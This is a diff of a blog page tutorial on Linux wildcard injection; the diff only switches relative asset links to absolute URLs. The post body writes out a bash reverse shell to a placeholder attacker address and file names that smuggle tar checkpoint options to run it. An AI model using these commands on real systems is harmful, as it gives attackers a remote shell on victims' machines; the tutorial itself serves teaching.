@@ -10,7 +10,7 @@
 <meta name="description" content="Practical Linux security problems and how to exploit them.">
 <meta name="author" content="">
 <link rel="canonical" href="https://conper.github.io/cybersecurity/vulnsandexp/linux/">
-<link crossorigin="anonymous" href="../../../assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
@@ -181,13 +181,13 @@
 </header>
 <div class="post-content"><h2 id="wildcard-injection">Wildcard Injection<a hidden class="anchor" aria-hidden="true" href="#wildcard-injection">#</a></h2>
 <p><strong>Wildcard Injection</strong> is an attack that takes advantage of <strong>wildcards</strong> (<code>*</code>, <code>?</code>, <code>[]</code>) in <strong>Linux</strong> commands to run harmful code. It happens when a user runs commands like <code>tar</code>, <code>rsync</code>, or <code>scp</code> in directories where an attacker has made files with tricky names that look like command options. This can make the system run commands without the user realizing it.</p>
-<p><img alt="1" loading="lazy" src="../../../images/vulnandexp/bash/wcinj1.png"></p>
+<p><img alt="1" loading="lazy" src="https://conper.github.io/images/vulnandexp/bash/wcinj1.png"></p>
 <p>An attacker can exploit <strong>Wildcard Injection</strong> by creating malicious files in a directory where the victim will execute a command using <code>*</code>. For example, they can use:</p>
 <pre tabindex="0"><code>echo &#34;bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;1&#34; &gt; revshell.sh
 echo &#34;&#34; &gt; --checkpoint=1
 echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=bash revshell.sh&#34;
 </code></pre><p>When the victim runs a command like <code>tar -cf backup.tar *</code>, <strong>tar</strong> will <strong>interpret the filenames as options and execute the code</strong>, starting a <strong>reverse shell</strong> to the attacker.</p>
-<p><img alt="1" loading="lazy" src="../../../images/vulnandexp/bash/wcinj2.png"></p>
+<p><img alt="1" loading="lazy" src="https://conper.github.io/images/vulnandexp/bash/wcinj2.png"></p>
 
 
 </div>
